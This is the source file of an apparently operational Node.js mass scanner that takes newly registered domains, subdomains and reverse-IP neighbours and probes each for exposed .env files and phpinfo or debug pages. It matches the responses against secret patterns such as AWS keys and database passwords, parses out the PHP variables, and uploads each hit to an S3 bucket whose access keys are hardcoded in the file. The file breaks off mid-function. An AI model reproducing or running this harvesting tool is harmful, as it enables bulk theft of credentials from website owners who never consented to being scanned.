/**
 * Scanner - Node.js port from start.py
 * Uses pack.json directly (no XOR encryption).
 * Build: pkg scanner.js --targets node18-linux-x64 -o scanner
 */
'use strict';

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');
const os = require('os');
const dns = require('dns');
const AdmZip = require('adm-zip');
const tls = require('tls');
const net = require('net');
const { URL } = require('url');

// ─── External deps ────────────────────────────────────────────
const axios = require('axios');
const cheerio = require('cheerio');
const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');

// ================================================================
// CONFIG — carica da pack.json
// ================================================================
const APP_DIR = __dirname;
const DATA_DIR = '/app';  // Volume persistente Bunny CDN
let packCfg = {};
try {
  packCfg = require(path.join(APP_DIR, 'pack.json'));
} catch (e) {
  console.error('[!] pack.json not found or invalid:', e.message);
  process.exit(1);
}

// Regex patterns & file lists from pack.json (replaces json.dat)
const patterns = packCfg.APP_REGEX_ENV_SHELL || [];
const file_envscan = [...new Set(packCfg.file_env_shellscan || [])];
const file_phpprofile = [...new Set(packCfg.file_phpprofile_shellscan || [])];

// --- Logging ---
const LOG_ACTIVE = false;
const LOG_UPLOAD_INTERVAL = 500 + Math.floor(Math.random() * 300); // 500-800

// --- Storage ---
const AWS_S3 = true;
const BUNNY_STORAGE = false;

// --- S3 Config ---
const S3_BUCKET = 'diablo-results-store';
const S3_FOLDER = 'diablo-results';
const S3_REGION = 'eu-north-1';
const S3_ACCESS_KEY = 'AKIAW3MEAPS545FBGS5I';
const S3_SECRET_KEY = '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';
// --- Bunny Config ---
const BUNNY_STORAGE_URL = '';
const BUNNY_API_KEY = '';

// --- Fonti target ---
const LOAD_FROM_SITE = false;
const LOAD_FROM_CIDR = false;
const LOAD_FROM_WHOISDS = true;    // WhoisDS newly registered domains (daily)
const USE_REV = true;

// --- Performance ---
const MAX_LIST_ENV = 20;
const MAX_LIST_PHP = 20;
const DNS_WORKERS_EC2 = 100;
const DNS_TIMEOUT_EC2 = 10;
const TOTAL_IPS_PER_CYCLE = 10000;
const NUM_CIDR_PER_CYCLE = 100;
const TOTAL_SLOTS = 400;
const NUM_WORKERS = 4;
const POOL_REFRESH_CYCLES = 1;    // ogni quanti cicli ricaricare gli IP range AWS
const PROBE_CONCURRENCY = 10;      // max richieste HTTP simultanee in fase probe
const SCAN_SITE_CONCURRENCY = 4;   // max siti scansionati in parallelo
const WHOISDS_DAYS = 45;           // WhoisDS free tier: ~45 giorni disponibili
const WHOISDS_DOMAINS_PER_CHUNK = 25; // domini da scansionare per batch

// ─── Derived constants ─────────────────────────────────────────
const s3Client = new S3Client({
  region: S3_REGION,
  credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
  forcePathStyle: false,
});
const RESULT_DIR = path.join(DATA_DIR, 'risultati');
const NEW_PATH_EXTRACT = path.join(RESULT_DIR, 'DATA_SPLIT');
const SITE_DIR = path.join(DATA_DIR, 'site');
const WHOISDS_DIR = path.join(DATA_DIR, 'whoisds');  // Cache WhoisDS daily ZIPs
const LOGS_DIR = path.join(DATA_DIR, 'logs');
const CONTAINER_NAME = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1000)}`;
const SLOT_HASH = parseInt(crypto.createHash('md5').update(CONTAINER_NAME).digest('hex').slice(0, 12), 16);
const INSTANCE_ID = SLOT_HASH % TOTAL_SLOTS;

let LOG_PATH = null;

// Axios instance (skip TLS verify)
const ax = axios.create({
  httpsAgent: new https.Agent({ rejectUnauthorized: false }),
  httpAgent: new http.Agent({}),
  timeout: 10000,
  maxRedirects: 0,
  validateStatus: () => true,
});

// ================================================================
// UTILITY
// ================================================================
const ts = () => new Date().toISOString().slice(11, 19);
const log = (...args) => console.log(`[${ts()}]`, ...args);
const randStr = (len) => crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// Concurrency gate (replaces gevent Pool)
// Results are settled in-place as each promise completes, avoiding peak memory
// accumulation of all raw promises before Promise.allSettled fires.
async function asyncPool(concurrency, items, fn) {
  const results = new Array(items.length);
  const executing = new Set();
  let idx = 0;
  for (const item of items) {
    const i = idx++;
    const p = Promise.resolve().then(() => fn(item));
    // Settle into results array immediately — no accumulation of unsettled promises
    p.then(
      v => { results[i] = { status: 'fulfilled', value: v }; },
      e => { results[i] = { status: 'rejected', reason: e }; }
    );
    const tracker = p.catch(() => {});
    executing.add(tracker);
    tracker.finally(() => executing.delete(tracker));
    if (executing.size >= concurrency) {
      await Promise.race(executing);
    }
  }
  await Promise.all(executing); // wait for remaining in-flight
  return results;
}

// Log tee (writes to file + stdout)
class TeeLogger {
  constructor(filepath) {
    this.logfile = fs.createWriteStream(filepath, { flags: 'a' });
    this._fd = null;
    this.logfile.on('open', (fd) => { this._fd = fd; });
    // Flush periodico ogni 2s per evitare perdita log su kill improvviso
    this._flushTimer = setInterval(() => {
      if (this._fd !== null) {
        fs.fsync(this._fd, () => {});
      }
    }, 2000);
    this._flushTimer.unref(); // non blocca l'uscita del processo
  }
  write(msg) {
    process.stdout.write(msg);
    this.logfile.write(msg);
  }
  // Cleanup: flush finale + stop timer
  destroy() {
    clearInterval(this._flushTimer);
    if (this._fd !== null) {
      fs.fsyncSync(this._fd);
    }
    this.logfile.end();
  }
}

// ================================================================
// S3 UPLOAD (via AWS SDK — nessuna SigV4 manuale)
// ================================================================
async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
  if (!AWS_S3) return false;
  const s3key = `${S3_FOLDER}/${remotePath}`;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[S3 UPLOAD] ${localPath} -> s3://${S3_BUCKET}/${s3key} (${attempt + 1}/${maxRetries})`);
      const body = await fs.promises.readFile(localPath);
      await s3Client.send(new PutObjectCommand({
        Bucket: S3_BUCKET,
        Key: s3key,
        Body: body,
      }));
      log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
      appendToS3Index(s3key).catch(e => log(`[S3 INDEX] Warning: ${e.message}`));
      return true;
    } catch (e) {
      const msg = e.message || String(e);
      const code = e.name === 'StatusCodeError' ? e.statusCode : 0;
      if (code === 429 || msg.includes('429') || msg.toLowerCase().includes('throttling')) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Rate limited, retry in ${wait}s`);
        await sleep(wait * 1000);
      } else if (code >= 500 || /status (50[023]|5\d\d)/i.test(msg)) {
        const wait = Math.pow(2, attempt);
        log(`[S3 UPLOAD] Server error (${code || msg}), retry in ${wait}s`);
        await sleep(wait * 1000);
      } else {
        log(`[S3 UPLOAD] Error ${s3key}: ${msg}`);
        return false;
      }
    }
  }
  return false;
}

async function appendToS3Index(s3KeyFull) {
  const indexKey = `${S3_FOLDER}/index.txt`;
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      let existing = '';
      try {
        const getRes = await s3Client.send(new GetObjectCommand({
          Bucket: S3_BUCKET,
          Key: indexKey,
        }));
        existing = (await getRes.Body.transformToString()) || '';
      } catch (e) {
        if (!e.name || e.name !== 'NoSuchKey') throw e;
      }

      const newContent = existing + s3KeyFull + '\n';
      await s3Client.send(new PutObjectCommand({
        Bucket: S3_BUCKET,
        Key: indexKey,
        Body: Buffer.from(newContent, 'utf8'),
        ContentType: 'text/plain',
      }));
      return;
    } catch (e) {
      await sleep(1000 * (attempt + 1));
    }
  }
}

async function uploadLogToS3() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToS3(LOG_PATH, remote, 1).catch(() => {});
}

// ================================================================
// BUNNY UPLOAD
// ================================================================
async function uploadFileToBunny(localPath, remotePath, maxRetries = 3) {
  if (!BUNNY_STORAGE) return false;
  const headers = { 'AccessKey': BUNNY_API_KEY };
  const url = `${BUNNY_STORAGE_URL}/${remotePath}`;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      log(`[BUNNY UPLOAD] ${localPath} -> ${remotePath} (${attempt + 1}/${maxRetries})`);
      const data = await fs.promises.readFile(localPath);
      const res = await ax.put(url, { headers, data, timeout: 30000 });

      if ([200, 201].includes(res.status)) {
        log(`[BUNNY UPLOAD] OK: ${remotePath}`);
        return true;
      }
      if (res.status === 429) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else if (res.status >= 500) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else {
        log(`[BUNNY UPLOAD] Error ${remotePath}: Status ${res.status}`);
        return false;
      }
    } catch (e) {
      if (attempt < maxRetries - 1) {
        await sleep(Math.pow(2, attempt) * 1000);
      } else {
        log(`[BUNNY UPLOAD] FAILED ${remotePath}: ${e.message}`);
      }
    }
  }
  return false;
}

async function uploadLogToBunny() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  const remote = `logs/${path.basename(LOG_PATH)}`;
  uploadFileToBunny(LOG_PATH, remote, 1).catch(() => {});
}

// ================================================================
// UPLOAD DISPATCH
// ================================================================
async function uploadFile(localPath, remotePath, maxRetries = 3) {
  let ok = false;
  if (AWS_S3) {
    if (await uploadFileToS3(localPath, remotePath, maxRetries)) ok = true;
  }
  if (BUNNY_STORAGE) {
    if (await uploadFileToBunny(localPath, remotePath, maxRetries)) ok = true;
  }
  return ok;
}

async function uploadLog() {
  if (!LOG_ACTIVE || !LOG_PATH) return;
  try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
  if (AWS_S3) await uploadLogToS3().catch(e => log(`[LOG UPLOAD] S3 failed: ${e.message}`));
  if (BUNNY_STORAGE) await uploadLogToBunny().catch(e => log(`[LOG UPLOAD] Bunny failed: ${e.message}`));
}

// ================================================================
// URL HELPERS
// ================================================================
const DEFAULT_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
  'Connection': 'keep-alive',
};

function* generateEnvBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, '');
  for (let i = 0; i < file_envscan.length; i += MAX_LIST_ENV) {
    yield file_envscan.slice(i, i + MAX_LIST_ENV).map(p => `${base}/${p.replace(/^\//, '')}`);
  }
}

function* generatePhpBatches(siteLink) {
  const base = siteLink.replace(/\/+$/, '');
  for (let i = 0; i < file_phpprofile.length; i += MAX_LIST_PHP) {
    yield file_phpprofile.slice(i, i + MAX_LIST_PHP).map(p => `${base}/${p.replace(/^\//, '')}`);
  }
}

function getInitialUrl(url) {
  if (url.startsWith('http://') || url.startsWith('https://')) return url;
  if (url.endsWith(':443')) return `https://${url}`;
  if (url.endsWith(':80')) return `http://${url}`;
  return `http://${url}`;
}

function getRetryUrl(url) {
  if (url.startsWith('http://')) return url.replace('http://', 'https://');
  if (url.startsWith('https://')) return url.replace('https://', 'http://');
  if (url.endsWith(':443') || url.endsWith(':80')) return null;
  return `https://${url}`;
}

// ================================================================
// SUBDOMAIN FINDER
// ================================================================
function cleanSubdomain(sub, domain) {
  sub = sub.trim().toLowerCase();
  sub = sub.replace(/^https?:\/\//, '');
  sub = sub.split(':')[0];
  if (sub.startsWith('*.')) sub = sub.slice(2);
  if (sub.endsWith('.')) sub = sub.slice(0, -1);
  return sub;
}

async function findSubdomains(domain) {
  const sources = [
    { name: 'ht', url: `https://api.hackertarget.com/hostsearch/?q=${domain}`, timeout: 10000 },
    { name: 'otx', url: `https://otx.alienvault.com/api/v1/indicators/domain/${domain}/passive_dns`, timeout: 10000 },
    { name: 'crt', url: `https://crt.sh/?q=%.${domain}&output=json`, timeout: 15000 },
  ];

  const results = await Promise.allSettled(sources.map(s => ax.get(s.url, { timeout: s.timeout })));
  const subdomains = new Set();

  for (let i = 0; i < sources.length; i++) {
    const r = results[i];
    if (r.status !== 'fulfilled' || !r.value || r.value.status !== 200) continue;
    const res = r.value;
    const source = sources[i].name;

    try {
      if (source === 'ht') {
        const text = typeof res.data === 'string' ? res.data : '';
        if (!text.toLowerCase().includes('error')) {
          for (const line of text.trim().split('\n')) {
            const sub = cleanSubdomain(line.split(',')[0], domain);
            if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
          }
        }
      } else if (source === 'otx') {
        const data = res.data;
        for (const entry of (data.passive_dns || [])) {
          const sub = cleanSubdomain(entry.hostname || '', domain);
          if (sub.endsWith(domain) && sub !== domain) subdomains.add(sub);
        }
      } else if (source === 'crt') {
        const data = res.data;
        for (const entry of data) {
          const name = entry.name_value || '';
          for (let cn of name.split('\n')) {
            cn = cleanSubdomain(cn, domain);
            if (cn.endsWith(domain) && cn !== domain) subdomains.add(cn);
          }
        }
      }
    } catch (_) {}
  }

  if (subdomains.size === 0) return null;
  return [...subdomains].sort().map(s => s.startsWith('www.') ? s.slice(4) : s);
}

// ================================================================
// REVERSE IP LOOKUP
// ================================================================
async function reverseIpLookup(ip) {
  try {
    const res = await ax.get(`https://api.hackertarget.com/reverseiplookup/?q=${ip}`, { timeout: 15000 });
    if (res.status !== 200) return null;
    const result = (typeof res.data === 'string' ? res.data : res.data.toString()).trim();
    if (!result || result.includes('No DNS A records found') || result.includes('API count exceeded') || result.toLowerCase().includes('error')) return null;
    return result.split('\n').map(d => {
      d = d.trim();
      if (!d) return null;
      if (d.startsWith('www.')) d = d.slice(4);
      return d;
    }).filter(Boolean);
  } catch (_) { return null; }
}

// ================================================================
// SITE FILE LOADER
// ================================================================
async function loadSitesFromFolder(workerId, numWorkers) {
  if (!LOAD_FROM_SITE) return { targets: [], filepath: null };

  try { await fs.promises.access(SITE_DIR); } catch (_) {
    log(`[SITE] Folder '${SITE_DIR}' not found. Create it and put .txt files with targets.`);
    return { targets: [], filepath: null };
  }

  const files = (await fs.promises.readdir(SITE_DIR))
    .filter(f => f.endsWith('.txt'))
    .sort();

  if (files.length === 0) return { targets: [], filepath: null };

  // Ogni worker prende il proprio file: worker 0 -> files[0], worker 1 -> files[1], etc.
  const myIdx = workerId;
  if (myIdx >= files.length) return { targets: [], filepath: null };

  const filename = files[myIdx];
  const filepath = path.join(SITE_DIR, filename);
  let targets = [];

  try {
    const content = await fs.promises.readFile(filepath, 'utf8');
    for (let line of content.split('\n')) {
      line = line.trim();
      if (line && !line.startsWith('#')) {
        if (!line.startsWith('http')) line = getInitialUrl(line);
        targets.push(line);
      }
    }
  } catch (e) {
    log(`[SITE] Error reading ${filename}: ${e.message}`);
    return { targets: [], filepath };
  }

  log(`[SITE] Worker ${workerId} — ${filename}: ${targets.length} targets loaded`);
  return { targets, filepath };
}

async function deleteSiteFile(filepath) {
  try {
    await fs.promises.unlink(filepath);
    log(`[SITE] ${path.basename(filepath)} DELETED`);
  } catch (e) {
    log(`[SITE] (!) Cannot delete ${path.basename(filepath)}: ${e.message}`);
  }
}

// ================================================================
// WHOISDS — Newly Registered Domains (daily)
// ================================================================
// WhoisDS URL format: https://www.whoisds.com/whois-database/newly-registered-domains/{base64(date.zip)}/nrd
// Each ZIP contains a single {date}.txt with one domain per line.
// Partitioning: each instance picks a day from the last 365 days.
//   dayIndex = (instanceId + cycleOffset * totalInstances) % WHOISDS_DAYS
//   date = today - dayIndex days

function whoisdsDateStr(daysAgo) {
  const d = new Date();
  d.setDate(d.getDate() - daysAgo);
  const mm = String(d.getMonth() + 1).padStart(2, '0');
  const dd = String(d.getDate()).padStart(2, '0');
  return `${d.getFullYear()}-${mm}-${dd}`;
}

function whoisdsZipName(daysAgo) {
  return whoisdsDateStr(daysAgo) + '.zip';
}

function whoisdsTxtName(daysAgo) {
  return whoisdsDateStr(daysAgo) + '.txt';
}

async function downloadWhoisDsDay(daysAgo) {
  const dateStr = whoisdsDateStr(daysAgo);
  const zipName = dateStr + '.zip';
  const zipPath = path.join(WHOISDS_DIR, zipName);
  const txtPath = path.join(WHOISDS_DIR, dateStr + '.txt');

  // Already extracted
  try { await fs.promises.access(txtPath); return txtPath; } catch (_) {}

  // Already downloaded but not extracted
  let zipExists = false;
  try { await fs.promises.access(zipPath); zipExists = true; } catch (_) {}

  if (!zipExists) {
    // WhoisDS uses base64-encoded filename in the URL path + /nrd suffix
    const b64 = Buffer.from(zipName).toString('base64');
    const url = `https://www.whoisds.com/whois-database/newly-registered-domains/${b64}/nrd`;
    log(`[WHOISDS] Downloading ${zipName}...`);
    try {
      const res = await ax.get(url, { timeout: 120000, responseType: 'arraybuffer' });
      if (res.status !== 200) {
        log(`[WHOISDS] HTTP ${res.status} for ${zipName}`);
        return null;
      }
      await fs.promises.writeFile(zipPath, res.data);
      log(`[WHOISDS] Downloaded ${zipName} (${(res.data.length / 1024 / 1024).toFixed(1)} MB)`);
    } catch (e) {
      log(`[WHOISDS] Download failed ${zipName}: ${e.message}`);
      return null;
    }
  }

  // Extract: WhoisDS ZIPs contain a single .txt file
  try {
    const zipData = await fs.promises.readFile(zipPath);
    const zip = new AdmZip(zipData);
    const entries = zip.getEntries();
    for (const entry of entries) {
      if (entry.entryName.endsWith('.txt') && !entry.isDirectory) {
        const domainData = entry.getData().toString('utf8');
        await fs.promises.writeFile(txtPath, domainData, 'utf8');
        log(`[WHOISDS] Extracted ${entry.entryName} -> ${dateStr}.txt (${domainData.split('\n').length.toLocaleString()} domains)`);
        return txtPath;
      }
    }
    log(`[WHOISDS] No .txt found inside ${zipName}`);
    return null;
  } catch (e) {
    log(`[WHOISDS] Extract failed ${zipName}: ${e.message}`);
    // Remove corrupted zip so it retries next time
    try { await fs.promises.unlink(zipPath); } catch (_) {}
    return null;
  }
}

// Carica un chunk di domini dal file WhoisDS giornaliero.
// Ogni chiamata restituisce fino a WHOISDS_DOMAINS_PER_CHUNK domini,
// avanzando un cursore interno salvato in un file .pos.
// Ritorna { targets: [...], filepath, done: bool } — done=true quando il file e' finito.
async function loadSitesFromWhoisDS(cycleOffset) {
  if (!LOAD_FROM_WHOISDS) return { targets: [], filepath: null, done: true };

  await fs.promises.mkdir(WHOISDS_DIR, { recursive: true });

  // Calcola il giorno assegnato a questa istanza
  const dayIndex = (INSTANCE_ID + cycleOffset * TOTAL_SLOTS) % WHOISDS_DAYS;
  const txtPath = await downloadWhoisDsDay(dayIndex);
  if (!txtPath) {
    log(`[WHOISDS] Instance ${INSTANCE_ID} — day ${dayIndex} (${whoisdsDateStr(dayIndex)}) FAILED. Skipping.`);
    return { targets: [], filepath: null, done: true };
  }

  // Cursor file per tenere traccia di dove siamo nel file
  const posFile = txtPath + '.pos';

  let offset = 0;
  try {
    offset = parseInt(await fs.promises.readFile(posFile, 'utf8'), 10) || 0;
  } catch (_) {}

  // Leggi a chunk
  const fd = await fs.promises.open(txtPath, 'r');
  let readPos = 0;
  const chunkSize = 64 * 1024; // 64KB read buffer
  const buf = Buffer.alloc(chunkSize);
  const domains = [];

  try {
    // Seek to saved offset
    if (offset > 0) {
      const stat = await fd.stat();
      if (offset >= stat.size) {
        // File finito, cancella .pos e ritorna done
        await fd.close();
        try { await fs.promises.unlink(posFile); } catch (_) {}
        log(`[WHOISDS] Instance ${INSTANCE_ID} — day ${dayIndex} (${whoisdsDateStr(dayIndex)}) COMPLETED.`);
        return { targets: [], filepath: txtPath, done: true };
      }
    }

    let leftover = '';
    while (domains.length < WHOISDS_DOMAINS_PER_CHUNK) {
      const { bytesRead } = await fd.read(buf, 0, chunkSize, offset + readPos);
      if (bytesRead === 0) break;
      readPos += bytesRead;

      const text = leftover + buf.toString('utf8', 0, bytesRead);
      const lines = text.split('\n');
      leftover = lines.pop(); // ultima linea potrebbe essere troncata

      for (const line of lines) {
        const d = line.trim().toLowerCase();
        if (d && domains.length < WHOISDS_DOMAINS_PER_CHUNK) {
          domains.push(getInitialUrl(d));
        }
      }
    }

    // Salva nuova posizione
    const newOffset = offset + readPos;
    await fs.promises.writeFile(posFile, String(newOffset), 'utf8');

    const dateStr = whoisdsDateStr(dayIndex);
    const moreLeft = domains.length >= WHOISDS_DOMAINS_PER_CHUNK;
    log(`[WHOISDS] Instance ${INSTANCE_ID}/${TOTAL_SLOTS} — day ${dayIndex} (${dateStr}): ${domains.length.toLocaleString()} domains loaded${moreLeft ? ' (more available)' : ' (last chunk)'}`);

    return { targets: domains, filepath: txtPath, done: !moreLeft };

  } finally {
    await fd.close();
  }
}

// ================================================================
// SCAN ENGINE — _scan_site ported to JS
// ================================================================
function buildRegexPattern(pattern) {
  const specials = /[.^$*+?{}[\]\\|()]/;
  if (specials.test(pattern)) return new RegExp(pattern, 'i'); // already regex
  const escaped = pattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const startB = /^[a-zA-Z0-9_]/.test(pattern) ? '\\b' : '';
  const endB = /[a-zA-Z0-9_]$/.test(pattern) ? '\\b' : '';
  return new RegExp(`${startB}${escaped}${endB}`, 'i');
}

// Pre-build all patterns
const compiledPatterns = patterns.map(p => buildRegexPattern(p));

async function scanSite(siteLink, isFallback = false) {
  try {
    log(`  [LOOK] Starting scan ${siteLink}`);

    let checked = 0;
    let checkeds = 0;
    let totalEnvAttempted = 0;
    let totalPhpAttempted = 0;
    let wildcardStrikeCount = 0;
    let fakeForSite = false;
    let foundForSite = false;
    let matchesFound = 0;
    const seenContentHashes = new Set();

    // ── Phase 1: ENV Scouting ──────────────────────────────
    const envBatches = [...generateEnvBatches(siteLink)];
    for (const batch of envBatches) {
      if (fakeForSite || foundForSite) break;

      totalEnvAttempted += batch.length;

      const results = await asyncPool(MAX_LIST_ENV, batch, url =>
        ax.get(url, {
          headers: { ...DEFAULT_HEADERS, 'Range': 'bytes=0-4096' },
          timeout: 6000,
          responseType: 'text',
          transformResponse: [(data) => data],
        })
      );

      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;

        checked++;
        let content = typeof res.data === 'string' ? res.data : '';
        const contentLower = content.toLowerCase();

        // HTML skip
        const head = contentLower.slice(0, 200);
        if (head.includes('<html') || head.includes('<!doctype') || head.includes('<body')) {
          //log(`  [!] HTML skip | ${res.config.url}`);
          continue;
        }

        // False positive checks
        if (contentLower.includes('<pre') && contentLower.includes('</pre')) {
          fakeForSite = true;
          //log(`  [!] Skip on ${siteLink} - NOPE (PRE tag)`);
          break;
        }
        if (contentLower.includes('popbox.fun')) {
          fakeForSite = true;
          //log(`  [!] Skip on ${siteLink} - NOPE (popbox)`);
          break;
        }

        // Regex check
        for (const regex of compiledPatterns) {
          if (regex.test(content)) {
            foundForSite = true;
            break;
          }
        }

        if (foundForSite) {
          matchesFound++;
          log(`  [+] Found | ${res.config.url}`);
          const suffix = randStr(20);
          const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
          await fs.promises.writeFile(savedPath, `${res.config.url}\n${content}`);
          const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
          uploadFile(savedPath, remote).catch(e => log(`  [ERR] Upload ENV failed: ${e.message}`));
          break;
        }
      }

      // Catch-all: >=10 .env files return 200 -> flood site
      if (checked >= 10 && !foundForSite) {
        fakeForSite = true;
        //log(`  [!] DUPE ENV (${checked}+ links) on ${siteLink} - NOPE`);
        break;
      }
    }

    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} — scanned ${totalEnvAttempted} urls, checked ${checked} (DUPE/flood)`);
      return;
    }

    if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} — scanned ${totalEnvAttempted} urls, checked ${checked}, matches ${matchesFound}`);
      await doReverseAndSubdomains(siteLink, isFallback);
      return;
    }

    // ── Phase 2: PHP Scouting (POST) ────────────────────────
    const phpBatches = [...generatePhpBatches(siteLink)];
    for (const batch of phpBatches) {
      if (fakeForSite || foundForSite) break;

      totalPhpAttempted += batch.length;

      const results = await asyncPool(MAX_LIST_PHP, batch, url =>
        ax.post(url, '0x01[]=x', {
          headers: { ...DEFAULT_HEADERS, 'Range': 'bytes=0-4096', 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 6000,
          responseType: 'text',
          transformResponse: [(data) => data],
        })
      );

      const uniqueResponses = new Map();
      const findFileRequests = [];

      for (const r of results) {
        if (fakeForSite || foundForSite) break;
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        if (![200, 206].includes(res.status)) continue;

        checkeds++;
        const requestUrl = res.config.url;

        if (!uniqueResponses.has(requestUrl)) {
          const content = typeof res.data === 'string' ? res.data : '';
          const contentLen = content.length;

          if (contentLen < 10 || contentLen > 1000000) continue;

          const head = content.slice(0, 200).toLowerCase();
          const isHtmlDoc = head.includes('<html') || head.includes('<!doctype');
          let isDebugPage = false;

          if (isHtmlDoc) {
            const contentStrHead = content.slice(0, 5000).toLowerCase();
            const debugKeywords = [
              'phpinfo()', 'php version', 'zend extension', 'php license',
              'sf-toolbar', 'symfony profiler', 'php-debugbar',
              'whoops! there was an error', 'stack trace',
              'aws_access_key_id', 'db_password', 'db_host', 'aws_secret',
            ];
            if (debugKeywords.some(k => contentStrHead.includes(k))) isDebugPage = true;
          }

          if (isHtmlDoc && !isDebugPage) continue;

          const contentHash = crypto.createHash('md5').update(content).digest('hex');
          if (seenContentHashes.has(contentHash)) {
            wildcardStrikeCount++;
            if (wildcardStrikeCount >= 5) {
              fakeForSite = true;
              //log(`  [!] DUP (5 duplicates) on ${siteLink} - NOPE`);
              break;
            }
            continue;
          }
          seenContentHashes.add(contentHash);
          uniqueResponses.set(requestUrl, { url: requestUrl, content, isDebugPage, isHtmlDoc });
          findFileRequests.push({ url: requestUrl, content, isDebugPage, isHtmlDoc });
        }
      }

      // Catch-all PHP
      if (checkeds >= 10 && !foundForSite) {
        fakeForSite = true;
        //log(`  [!] DUPE PHP (${checkeds}+ links) on ${siteLink} - NOPE`);
        break;
      }

      // Deep extraction
      if (uniqueResponses.size > 0) {
        //log(`  [DEEP] ${uniqueResponses.size} valid targets, regex extraction on ${siteLink}`);

        for (const item of findFileRequests) {
          if (!item) continue;
          const contentsx = typeof item.content === 'string' ? item.content : item.content.toString('utf8');

          // Regex match
          for (const regex of compiledPatterns) {
            if (regex.test(contentsx)) {
              foundForSite = true;
              break;
            }
          }

          if (foundForSite) {
            matchesFound++;
            log(`  [+] Found | ${item.url}`);

            // PHPINFO extraction
            if (item.isDebugPage || contentsx.toLowerCase().includes('phpinfo')) {
              try {
                const $ = cheerio.load(contentsx);
                const h2 = $('h2').filter((_, el) => $(el).text() === 'PHP Variables');
                if (h2.length > 0) {
                  const table = h2.next('table');
                  if (table.length > 0) {
                    let formattedOutput = '';
                    table.find('tr').each((_, row) => {
                      const cols = $(row).find('td');
                      if (cols.length >= 2) {
                        const varName = $(cols[0]).text().trim();
                        const varValue = $(cols[1]).text().trim();
                        const match = varName.match(/\['([^']+)'\]/);
                        if (match) {
                          formattedOutput += `${match[1]} \t ${varValue}\n`;
                        }
                      }
                    });
                    if (formattedOutput) {
                      log(`  [+] PHPINFO FOUND | ${item.url}`);
                      const suffix = randStr(20);
                      const savedPath = path.join(NEW_PATH_EXTRACT, `PHPINFO_${suffix}.txt`);
                      await fs.promises.writeFile(savedPath, `${item.url}\n${formattedOutput}`);
                      const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
                      uploadFile(savedPath, remote).catch(e => log(`  [ERR] Upload PHPINFO failed: ${e.message}`));
                    }
                  }
                }
              } catch (_) {}
            }
            break;
          }
        }
      }

      if (fakeForSite || foundForSite) break;
    }

    // ── Summary ─────────────────────────────────────────────
    const totalTested = checked + checkeds;
    const totalScanned = totalEnvAttempted + totalPhpAttempted;
    if (fakeForSite) {
      log(`  [OK] STOP NOPE ${siteLink} — scanned ${totalScanned} urls, checked ${totalTested} (DUPE/flood)`);
    } else if (foundForSite) {
      log(`  [OK] STOP FOUND ${siteLink} — scanned ${totalScanned} urls, checked ${totalTested}, matches ${matchesFound}`);
      await doReverseAndSubdomains(siteLink, isFallback);
    } else {
      log(`  [OK] STOP NONE ${siteLink} — scanned ${totalScanned} urls, checked ${totalTested}`);
    }
  } catch (e) {
    try {
      await fs.promises.appendFile(path.join(RESULT_DIR, 'err.log'), e.message + '\n');
    } catch (_) {}
  }
}

// ================================================================
// URL PROCESSOR (concurrency-limited probe + scan)
// ================================================================

async function processUrls(urlsList, isFallback = false) {
  log(`\n[CHK] Starting scan on ${urlsList.length} URLs (fallback=${isFallback})`);

  for (let i = 0; i < urlsList.length; i += 200) {
    const chunk = urlsList.slice(i, i + 200);
    const probes = chunk.map(url => ({ orig: url, probe: getInitialUrl(url) }));
    log(`[CHK] Probing ${probes.length} URLs (concurrency=${PROBE_CONCURRENCY})...`);

    // FASE 1 — Probe HTTP: concorrenza limitata (no socket saturation)
    const rawResults = await asyncPool(PROBE_CONCURRENCY, probes, ({ probe }) =>
      ax.get(probe, { timeout: 3000, responseType: 'stream' })
    );

    const hostsBySite = {};
    const retryList = [];
    for (let j = 0; j < rawResults.length; j++) {
      const r = rawResults[j];
      if (r.status !== 'fulfilled' || !r.value) {
        const retryU = getRetryUrl(probes[j].orig);
        if (retryU) retryList.push({ retryUrl: retryU, origIdx: j });
        continue;
      }
      const res = r.value;
      try { res.data.destroy(); } catch (_) {}
      if ([200, 403, 206].includes(res.status)) {
        const siteUrl = probes[j].probe;
        if (!hostsBySite[siteUrl]) {
          hostsBySite[siteUrl] = {
            env: [...generateEnvBatches(siteUrl)],
            php: [...generatePhpBatches(siteUrl)],
          };
        }
      } else {
        const retryU = getRetryUrl(probes[j].orig);
        if (retryU) retryList.push({ retryUrl: retryU, origIdx: j });
      }
    }

